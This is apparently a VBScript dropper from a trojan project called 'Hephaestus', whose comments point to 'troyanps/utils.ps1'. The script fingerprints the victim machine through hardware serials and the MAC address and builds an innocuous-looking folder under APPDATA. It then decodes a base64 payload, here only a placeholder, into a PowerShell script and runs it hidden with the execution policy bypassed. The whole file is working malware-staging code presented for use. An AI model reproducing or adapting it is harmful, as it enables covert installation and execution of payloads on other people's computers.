Dim bodyX, bodyPs1Path
bodyX="0102"

' Same folder and filename as Get-BodyPath in troyanps/utils.ps1 (%APPDATA%\<machine>\<machine>_b.ps1).
' PowerShell writes UTF-16 to Exec.StdOut; VB reads ANSI and corrupts the path. Write UTF-8 path via env + marker file instead.
Function GetBodyPs1Path()
    Dim sh, cmd, psInner, exe, p, fso, markerPath, appd
    Set sh = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    markerPath = fso.BuildPath(fso.GetSpecialFolder(2), fso.GetTempName & ".heph")
    sh.Environment("PROCESS")("HEPH_LAUNCH_BODYPS1") = markerPath
    psInner = "$mc=''; try { $b=(Get-WmiObject Win32_BIOS).SerialNumber; $m=(Get-WmiObject Win32_BaseBoard).SerialNumber; $na=(Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -and $_.IPEnabled}); $mac=$na[0].MACAddress; $s=$b+$m+$mac; $h=[System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($s)); $t=[Convert]::ToBase64String($h) -replace '[^a-zA-Z0-9]',''; $mc=$t.Substring(0,12) } catch { $mc='Hephaestus' }; $d=Join-Path ([Environment]::GetFolderPath('ApplicationData')) $mc; New-Item -ItemType Directory -Force -Path $d|Out-Null; $p=Join-Path $d ($mc+'_b.ps1'); [IO.File]::WriteAllText($env:HEPH_LAUNCH_BODYPS1, $p, [Text.UTF8Encoding]::new($false))"
    cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command " & Chr(34) & psInner & Chr(34)
    Set exe = sh.Exec(cmd)
    Do While exe.Status = 0
        WScript.Sleep 50
    Loop
    p = ""
    If fso.FileExists(markerPath) Then
        p = Trim(fso.OpenTextFile(markerPath, 1, False, TristateFalse).ReadAll())
        fso.DeleteFile markerPath
    End If
    If Len(p) = 0 Then
        appd = sh.ExpandEnvironmentStrings("%APPDATA%")
        p = fso.BuildPath(fso.BuildPath(appd, "Hephaestus"), "body.ps1")
        If Not fso.FolderExists(fso.GetParentFolderName(p)) Then
            fso.CreateFolder fso.GetParentFolderName(p)
        End If
    End If
    GetBodyPs1Path = p
End Function

bodyPs1Path = GetBodyPs1Path()
EnsureParentFolderExists bodyPs1Path
DecodeBase64ToFile bodyX, bodyPs1Path

Sub Run()
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    Dim command
    command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & bodyPs1Path & """"
    shell.Run command, 0, True
End Sub

Call Run

Sub EnsureParentFolderExists(filePath)
    Dim fso, parent
    Set fso = CreateObject("Scripting.FileSystemObject")
    parent = fso.GetParentFolderName(filePath)
    If Len(parent) > 0 And Not fso.FolderExists(parent) Then
        fso.CreateFolder parent
    End If
End Sub

Function DecodeBase64ToFile(base64String, outputFilePath)
    Dim xmlDoc
    Set xmlDoc = CreateObject("Msxml2.DOMDocument.3.0")
    
    Dim node
    Set node = xmlDoc.createElement("base64")
    node.dataType = "bin.base64"
    node.Text = base64String
    
    Dim binaryData
    binaryData = node.nodeTypedValue
    
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.Write binaryData
    
    stream.SaveToFile outputFilePath, 2
    stream.Close
    
    Set stream = Nothing
    Set node = Nothing
    Set xmlDoc = Nothing
End Function
